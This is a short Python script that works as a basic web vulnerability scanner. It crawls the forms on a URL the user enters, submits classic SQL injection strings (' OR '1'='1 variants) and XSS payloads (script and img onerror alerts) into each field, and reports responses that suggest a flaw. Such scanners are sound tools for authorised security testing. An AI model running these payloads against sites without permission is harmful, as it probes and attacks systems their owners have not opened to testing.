import requests
from bs4 import BeautifulSoup

sql_payloads = ["' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

def find_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    return soup.find_all("form")

def test_sql_injection(url, form):
    for payload in sql_payloads:
        data = {}
        action = form.get('action') or url
        inputs = form.find_all("input")
        for input_tag in inputs:
            if input_tag.get('name'):
                data[input_tag.get('name')] = payload
        full_url = url if action.startswith('http') else url + action
        response = requests.post(full_url, data=data)
        if "error" in response.text or "syntax" in response.text:
            print(f"[!] SQL Injection found with payload: {payload}")
            break

def test_xss(url, form):
    for payload in xss_payloads:
        data = {}
        action = form.get('action') or url
        inputs = form.find_all("input")
        for input_tag in inputs:
            if input_tag.get('name'):
                data[input_tag.get('name')] = payload
        full_url = url if action.startswith('http') else url + action
        response = requests.post(full_url, data=data)
        if payload in response.text:
            print(f"[!] XSS Vulnerability found with payload: {payload}")
            break

def scan_website(url):
    print(f"Scanning website: {url}")
    forms = find_forms(url)
    print(f"Found {len(forms)} forms in {url}")
    for form in forms:
        print("[*] Testing for SQL Injection")
        test_sql_injection(url, form)
        print("[*] Testing for XSS")
        test_xss(url, form)

if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    scan_website(target_url)
